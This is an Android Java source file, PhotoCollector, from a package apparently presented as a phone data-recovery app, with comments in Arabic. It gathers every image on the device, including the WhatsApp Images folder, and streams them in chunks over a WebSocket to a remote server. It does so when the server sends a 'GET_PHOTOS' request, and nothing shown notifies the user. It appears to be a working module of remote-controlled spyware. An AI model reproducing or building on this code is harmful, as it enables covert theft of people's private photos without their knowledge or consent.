package com.recoverdata.phone.data;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.webkit.MimeTypeMap;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.recoverdata.phone.network.MessageProtocol;
import com.recoverdata.phone.network.WebSocketManager;
import com.recoverdata.phone.utils.Logger;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

/**
 * PhotoCollector
 * ============================================================
 * يجمع الصور من الجهاز ويرسلها للسيرفر.
 *
 * المسؤوليات:
 *   1. قراءة قائمة الصور من MediaStore (Android 10+) أو الملفات.
 *   2. تصفية حسب المسار/التاريخ (اختياري).
 *   3. قراءة كل صورة وتحويلها إلى Base64.
 *   4. تقسيم الصور الكبيرة إلى chunks.
 *   5. إرسال كل chunk عبر WebSocket.
 *
 * طرق القراءة:
 *   - Android 10+ : MediaStore (آمن، لا يحتاج صلاحيات خاصة).
 *   - Android 9-  : المسح المباشر لـ /DCIM و /Pictures.
 *   - مسار محدد  : قراءة مباشرة من المسار.
 *
 * يعتمد على:
 *   - DataSender  (إرسال الملفات كـ chunks)
 *   - WebSocketManager
 *   - MessageProtocol
 * ============================================================
 */
public class PhotoCollector {

    // =============================================================
    // 1. الثوابت
    // =============================================================
    private static final String TAG = "PhotoCollector";

    // الحد الأقصى لحجم الصورة الواحدة (50 MB)
    private static final long MAX_PHOTO_SIZE = 50 * 1024 * 1024L;

    // امتدادات الصور المدعومة
    private static final String[] IMAGE_EXTENSIONS = {
            ".jpg", ".jpeg", ".png", ".gif", ".bmp",
            ".webp", ".heic", ".heif", ".tiff", ".tif"
    };

    // =============================================================
    // 2. الحقول
    // =============================================================
    private final Context appContext;
    private final ContentResolver contentResolver;

    // حالة الإلغاء (لإيقاف العملية من الخارج)
    private volatile boolean cancelled = false;

    // =============================================================
    // 3. البناء
    // =============================================================
    public PhotoCollector(@NonNull Context context) {
        this.appContext = context.getApplicationContext();
        this.contentResolver = appContext.getContentResolver();
    }

    // =============================================================
    // 4. الدالة الرئيسية
    // =============================================================

    /**
     * جمع الصور وإرسالها.
     *
     * @param pathFilter مسار مخصص (null = كل الصور)
     * @param limit      الحد الأقصى (0 = الكل)
     * @param offset     تخطي أول N صورة
     * @param sender     DataSender للإرسال
     * @param ws         WebSocketManager
     * @param requestId  معرف الطلب (للرد)
     * @return عدد الصور المُرسلة
     */
    public int collectAndSend(@Nullable String pathFilter,
                              int limit,
                              int offset,
                              @NonNull DataSender sender,
                              @NonNull WebSocketManager ws,
                              @Nullable String requestId) throws Exception {

        Logger.i(TAG, "Starting photo collection (limit=" + limit
                + ", offset=" + offset + ", path=" + pathFilter + ")");

        cancelled = false;

        // ----- 1. جمع قائمة الصور -----
        List<PhotoInfo> photos;

        if (pathFilter != null && !pathFilter.isEmpty()) {
            // مسار محدد
            photos = collectFromPath(pathFilter);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ : MediaStore
            photos = collectFromMediaStore();
        } else {
            // Android 9- : مسح مباشر
            photos = collectFromFileSystem();
        }

        Logger.i(TAG, "Found " + photos.size() + " photos total");

        if (photos.isEmpty()) {
            Logger.w(TAG, "No photos found");
            return 0;
        }

        // ----- 2. تطبيق offset و limit -----
        int from = Math.max(0, Math.min(offset, photos.size()));
        int to = (limit > 0)
                ? Math.min(from + limit, photos.size())
                : photos.size();

        List<PhotoInfo> selected = photos.subList(from, to);
        Logger.i(TAG, "Selected " + selected.size() + " photos (from "
                + from + " to " + to + ")");

        // ----- 3. إرسال كل صورة -----
        int sent = 0;
        int failed = 0;

        for (int i = 0; i < selected.size(); i++) {
            if (cancelled) {
                Logger.w(TAG, "Collection cancelled");
                break;
            }

            PhotoInfo photo = selected.get(i);

            try {
                boolean ok = sendPhoto(photo, sender, ws, requestId);

                if (ok) {
                    sent++;
                    Logger.i(TAG, "[" + (i + 1) + "/" + selected.size()
                            + "] ✅ Sent: " + photo.displayName);
                } else {
                    failed++;
                    Logger.w(TAG, "[" + (i + 1) + "/" + selected.size()
                            + "] ❌ Failed: " + photo.displayName);
                }

                // إشعار التقدم كل 10 صور
                if ((i + 1) % 10 == 0) {
                    notifyProgress(ws, requestId, sent, selected.size());
                }

                // استراحة صغيرة لتجنب إغراق WebSocket
                Thread.sleep(50);

            } catch (Exception e) {
                failed++;
                Logger.e(TAG, "Error sending photo: " + photo.displayName, e);
            }
        }

        Logger.i(TAG, "Collection done. Sent=" + sent + ", Failed=" + failed);
        return sent;
    }

    /**
     * إلغاء العملية الجارية.
     */
    public void cancel() {
        cancelled = true;
        Logger.i(TAG, "Cancel requested");
    }

    // =============================================================
    // 5. جمع الصور
    // =============================================================

    /**
     * جمع الصور عبر MediaStore (Android 10+).
     */
    @NonNull
    private List<PhotoInfo> collectFromMediaStore() {
        List<PhotoInfo> result = new ArrayList<>();

        Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.MIME_TYPE,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.DATA
        };

        // ترتيب حسب التاريخ (الأحدث أولاً)
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = contentResolver.query(
                collection, projection, null, null, sortOrder)) {

            if (cursor == null) {
                Logger.w(TAG, "MediaStore query returned null");
                return result;
            }

            int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            int nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
            int sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
            int mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE);
            int dataCol = cursor.getColumnIndex(MediaStore.Images.Media.DATA);

            while (cursor.moveToNext()) {
                try {
                    long id = cursor.getLong(idCol);
                    String name = cursor.getString(nameCol);
                    long size = cursor.getLong(sizeCol);
                    String mime = cursor.getString(mimeCol);
                    String dataPath = (dataCol >= 0) ? cursor.getString(dataCol) : null;

                    // تخطي الملفات الكبيرة جداً
                    if (size > MAX_PHOTO_SIZE) {
                        Logger.w(TAG, "Skipping large photo: " + name + " (" + size + ")");
                        continue;
                    }

                    // بناء URI
                    Uri uri = Uri.withAppendedPath(collection, String.valueOf(id));

                    PhotoInfo info = new PhotoInfo();
                    info.uri = uri;
                    info.displayName = name != null ? name : "photo_" + id;
                    info.size = size;
                    info.mimeType = mime != null ? mime : guessMimeFromName(info.displayName);
                    info.path = dataPath;
                    info.source = PhotoInfo.Source.MEDIASTORE;

                    result.add(info);

                } catch (Exception e) {
                    Logger.w(TAG, "Error reading cursor row", e);
                }
            }

        } catch (Exception e) {
            Logger.e(TAG, "MediaStore query failed", e);
        }

        return result;
    }

    /**
     * جمع الصور من مسار محدد (ملف أو مجلد).
     */
    @NonNull
    private List<PhotoInfo> collectFromPath(@NonNull String path) {
        List<PhotoInfo> result = new ArrayList<>();

        File target = new File(path);

        if (!target.exists()) {
            Logger.w(TAG, "Path does not exist: " + path);
            return result;
        }

        if (target.isFile()) {
            // ملف واحد
            if (isImageFile(target)) {
                result.add(buildFromFile(target));
            }
        } else if (target.isDirectory()) {
            // مجلد - امسح بشكل تكراري
            scanDirectory(target, result, 0);
        }

        return result;
    }

    /**
     * جمع الصور بالمسح المباشر (Android 9-).
     */
    @NonNull
    private List<PhotoInfo> collectFromFileSystem() {
        List<PhotoInfo> result = new ArrayList<>();

        String[] commonDirs = {
                "/sdcard/DCIM",
                "/sdcard/Pictures",
                "/sdcard/Download",
                "/sdcard/WhatsApp/Media/WhatsApp Images"
        };

        for (String dir : commonDirs) {
            File f = new File(dir);
            if (f.exists() && f.isDirectory()) {
                scanDirectory(f, result, 0);
            }
        }

        return result;
    }

    /**
     * مسح مجلد بشكل تكراري.
     */
    private void scanDirectory(@NonNull File dir, @NonNull List<PhotoInfo> out, int depth) {
        if (depth > 5 || cancelled) return;

        File[] files = dir.listFiles();
        if (files == null) return;

        for (File f : files) {
            if (cancelled) return;

            try {
                if (f.isDirectory()) {
                    // تخطي المجلدات المخفية
                    if (!f.getName().startsWith(".")) {
                        scanDirectory(f, out, depth + 1);
                    }
                } else if (f.isFile() && isImageFile(f)) {
                    if (f.length() <= MAX_PHOTO_SIZE) {
                        out.add(buildFromFile(f));
                    }
                }
            } catch (Exception e) {
                Logger.w(TAG, "Error scanning: " + f.getAbsolutePath());
            }
        }
    }

    // =============================================================
    // 6. إرسال صورة واحدة
    // =============================================================
    private boolean sendPhoto(@NonNull PhotoInfo photo,
                              @NonNull DataSender sender,
                              @NonNull WebSocketManager ws,
                              @Nullable String requestId) throws Exception {

        // ----- 1. فتح InputStream -----
        InputStream inputStream = openInputStream(photo);
        if (inputStream == null) {
            Logger.w(TAG, "Failed to open: " + photo.displayName);
            return false;
        }

        try {
            // ----- 2. إرسال عبر DataSender -----
            boolean ok = sender.sendStream(
                    inputStream,
                    photo.displayName,
                    photo.mimeType,
                    photo.size,
                    "GET_PHOTOS",
                    requestId,
                    ws
            );

            return ok;

        } finally {
            try { inputStream.close(); } catch (Exception ignored) {}
        }
    }

    /**
     * فتح InputStream للصورة حسب مصدرها.
     */
    @Nullable
    private InputStream openInputStream(@NonNull PhotoInfo photo) {
        try {
            if (photo.source == PhotoInfo.Source.MEDIASTORE && photo.uri != null) {
                return contentResolver.openInputStream(photo.uri);
            }

            if (photo.path != null) {
                File f = new File(photo.path);
                if (f.exists() && f.canRead()) {
                    return new FileInputStream(f);
                }
            }

            // احتياط: جرّب URI
            if (photo.uri != null) {
                return contentResolver.openInputStream(photo.uri);
            }

        } catch (Exception e) {
            Logger.e(TAG, "openInputStream failed for " + photo.displayName, e);
        }
        return null;
    }

    // =============================================================
    // 7. الإشعارات
    // =============================================================
    private void notifyProgress(@NonNull WebSocketManager ws,
                                @Nullable String requestId,
                                int sent,
                                int total) {
        try {
            JSONObject data = new JSONObject();
            data.put("sent", sent);
            data.put("total", total);
            data.put("progress", (total > 0) ? (sent * 100 / total) : 0);

            String msg = MessageProtocol.buildEvent("PHOTOS_PROGRESS", data);
            ws.send(msg);
        } catch (Exception e) {
            Logger.w(TAG, "notifyProgress error", e);
        }
    }

    // =============================================================
    // 8. أدوات مساعدة
    // =============================================================

    /**
     * هل الملف صورة؟
     */
    private boolean isImageFile(@NonNull File file) {
        String name = file.getName().toLowerCase();
        for (String ext : IMAGE_EXTENSIONS) {
            if (name.endsWith(ext)) return true;
        }
        return false;
    }

    /**
     * بناء PhotoInfo من ملف.
     */
    @NonNull
    private PhotoInfo buildFromFile(@NonNull File file) {
        PhotoInfo info = new PhotoInfo();
        info.uri = Uri.fromFile(file);
        info.displayName = file.getName();
        info.size = file.length();
        info.mimeType = guessMimeFromName(file.getName());
        info.path = file.getAbsolutePath();
        info.source = PhotoInfo.Source.FILE;
        return info;
    }

    /**
     * تخمين MIME من اسم الملف.
     */
    @NonNull
    private String guessMimeFromName(@NonNull String name) {
        String ext = "";
        int dot = name.lastIndexOf('.');
        if (dot >= 0) ext = name.substring(dot + 1).toLowerCase();

        switch (ext) {
            case "jpg":
            case "jpeg":
                return "image/jpeg";
            case "png":
                return "image/png";
            case "gif":
                return "image/gif";
            case "bmp":
                return "image/bmp";
            case "webp":
                return "image/webp";
            case "heic":
            case "heif":
                return "image/heic";
            case "tiff":
            case "tif":
                return "image/tiff";
            default:
                String mime = MimeTypeMap.getSingleton()
                        .getMimeTypeFromExtension(ext);
                return mime != null ? mime : "image/jpeg";
        }
    }

    // =============================================================
    // 9. كلاس PhotoInfo
    // =============================================================
    public static class PhotoInfo {
        public enum Source { MEDIASTORE, FILE }

        public Uri uri;
        public String displayName = "unknown";
        public long size = 0;
        public String mimeType = "image/jpeg";
        public String path;
        public Source source = Source.FILE;

        @NonNull
        @Override
        public String toString() {
            return "PhotoInfo{" + displayName + ", " + size + " bytes}";
        }
    }
}